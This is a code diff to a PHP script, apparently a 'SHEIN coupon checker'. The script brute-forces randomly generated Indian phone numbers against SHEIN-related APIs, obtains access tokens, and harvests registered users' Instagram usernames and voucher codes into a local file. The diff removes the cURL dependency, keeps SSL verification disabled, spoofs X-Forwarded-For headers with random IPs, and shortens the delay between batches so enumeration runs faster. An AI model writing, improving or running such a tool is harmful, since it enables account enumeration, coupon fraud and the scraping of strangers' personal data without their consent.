@@ -2,51 +2,46 @@
 // File to save valid coupons
 $validFile = getenv('USERPROFILE') . '/Desktop/Downloads/shein_valid.txt';
 
-// Check if cURL is available
-if (!function_exists('curl_init')) {
-    die("❌ ERROR: cURL extension is not enabled!\n\nTo fix this:\n1. Open php.ini file\n2. Find: ;extension=curl\n3. Remove the semicolon: extension=curl\n4. Save and restart\n");
-}
-
-function httpCall($url, $data = null, $headers = [], $method = "GET", $returnHeaders = false) {
-    $ch = curl_init();
+// Simple HTTP function without cURL
+function httpCall($url, $data = null, $headers = [], $method = "GET") {
+    $options = [
+        'http' => [
+            'method' => $method,
+            'header' => implode("\r\n", $headers),
+            'timeout' => 10,
+            'ignore_errors' => true
+        ],
+        'ssl' => [
+            'verify_peer' => false,
+            'verify_peer_name' => false
+        ]
+    ];
     
-    // Basic curl options
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
-    
-    // Add headers
-    if (!empty($headers)) {
-        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-    } else {
-        // Default headers
-        $ip = randIp();
-        curl_setopt($ch, CURLOPT_HTTPHEADER, [
-            "X-Forwarded-For: $ip",
-            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        ]);
+    // For POST requests
+    if (strtoupper($method) === "POST" && $data) {
+        $options['http']['content'] = $data;
     }
-    
-    // Handle POST request
-    if (strtoupper($method) === "POST") {
-        curl_setopt($ch, CURLOPT_POST, true);
-        if ($data) {
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        }
-    } elseif ($data && strtoupper($method) === "GET") {
-        // For GET with data, append to URL
+    // For GET requests with data
+    elseif ($data && strtoupper($method) === "GET") {
         $url .= (strpos($url, '?') === false ? '?' : '&') . http_build_query($data);
-        curl_setopt($ch, CURLOPT_URL, $url);
     }
     
-    $output = curl_exec($ch);
-    curl_close($ch);
+    $context = stream_context_create($options);
     
-    return $output;
+    // Add default headers if none provided
+    if (empty($headers)) {
+        $ip = randIp();
+        $options['http']['header'] = "X-Forwarded-For: $ip\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+        $context = stream_context_create($options);
+    }
+    
+    $result = @file_get_contents($url, false, $context);
+    
+    if ($result === false) {
+        return "";
+    }
+    
+    return $result;
 }
 
 function randIp() { 
@@ -99,11 +94,16 @@ function checkNumber($number, &$triedNumbers) {
     $res = httpCall($url, $data, $headers, "POST");
     
     if (empty($res)) {
-        echo "Error: Empty response from token API\n";
+        echo "Error: No response from API\n";
         return false;
     }
     
-    $j = json_decode($res, true);
+    $j = @json_decode($res, true);
+    if ($j === null) {
+        echo "Error: Invalid JSON response\n";
+        return false;
+    }
+    
     $access_token = $j['access_token'] ?? null;
     
     if(!$access_token) {
@@ -131,11 +131,15 @@ function checkNumber($number, &$triedNumbers) {
     $res = httpCall($url, $data, $headers, "POST");
     
     if (empty($res)) {
-        echo "Error: Empty response from account check\n";
+        echo "Error: No response from account check\n";
         return false;
     }
     
-    $j = json_decode($res, true);
+    $j = @json_decode($res, true);
+    if ($j === null) {
+        echo "Error: Invalid JSON from account check\n";
+        return false;
+    }
     
     if(isset($j['success']) && $j['success'] === false) {
         echo "Number $number is not registered\n";
@@ -174,11 +178,15 @@ function checkNumber($number, &$triedNumbers) {
     $res = httpCall($url, $payload, $headers, "POST");
     
     if (empty($res)) {
-        echo "Error: Empty response from token generation\n";
+        echo "Error: No response from token generation\n";
         return false;
     }
     
-    $j = json_decode($res, true);
+    $j = @json_decode($res, true);
+    if ($j === null) {
+        echo "Error: Invalid JSON from token generation\n";
+        return false;
+    }
     
     if(empty($j['access_token'])) {
         echo "Error generating SHEIN token for $number\n";
@@ -204,11 +212,15 @@ function checkNumber($number, &$triedNumbers) {
     $res = httpCall($url, "", $headers, "GET");
     
     if (empty($res)) {
-        echo "Error: Empty response from user API\n";
+        echo "Error: No response from user API\n";
         return false;
     }
     
-    $decoded = json_decode($res, true);
+    $decoded = @json_decode($res, true);
+    if ($decoded === null) {
+        echo "Error: Invalid JSON from user API\n";
+        return false;
+    }
     
     if (!isset($decoded['user_data']['instagram_data']['username'])) {
         echo "No valid data found for $number\n";
@@ -222,7 +234,7 @@ function checkNumber($number, &$triedNumbers) {
     $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';
     
     // Check if voucher is valid (not N/A)
-    if ($voucher !== 'N/A' && !empty($voucher)) {
+    if ($voucher !== 'N/A' && !empty($voucher) && $voucher !== '') {
         echo "\n✅ COUPON FOUND!\n";
         echo "Number: $number\n";
         echo "Instagram: $username\n";
@@ -259,14 +271,9 @@ function clearScreen() {
     }
 }
 
-// Check if cURL is available
-if (!function_exists('curl_version')) {
-    die("❌ cURL extension is not enabled in PHP!\n\nPlease enable it in php.ini:\n1. Open php.ini\n2. Remove semicolon from: ;extension=curl\n3. Save and restart\n");
-}
-
 clearScreen();
 echo "========================================\n";
-echo "SHEIN COUPON CHECKER - FASTEST VERSION\n";
+echo "SHEIN COUPON CHECKER - NO cURL VERSION\n";
 echo "========================================\n\n";
 echo "Auto-generating Indian numbers (8 or 9 starting)\n";
 echo "Saving valid coupons to: $validFile\n";
@@ -289,6 +296,7 @@ while (true) {
     $numbers = [];
     for ($i = 0; $i < $batchSize; $i++) {
         $num = generateIndianNumber();
+        // Ensure no duplicates
         while (in_array($num, $triedNumbers)) {
             $num = generateIndianNumber();
         }
@@ -317,15 +325,15 @@ while (true) {
     echo "📊 Stats: Checked: $checkedCount | Found: $foundCount\n";
     echo str_repeat("=", 50) . "\n\n";
     
-    // Wait 2 seconds before next batch
-    sleep(2);
+    // Wait 1 second before next batch
+    sleep(1);
     
     // Clear screen for next batch
     clearScreen();
     
     // Re-display header
     echo "========================================\n";
-    echo "SHEIN COUPON CHECKER - FASTEST VERSION\n";
+    echo "SHEIN COUPON CHECKER - NO cURL VERSION\n";
     echo "========================================\n\n";
     echo "Auto-generating Indian numbers (8 or 9 starting)\n";
     echo "Saving valid coupons to: $validFile\n";
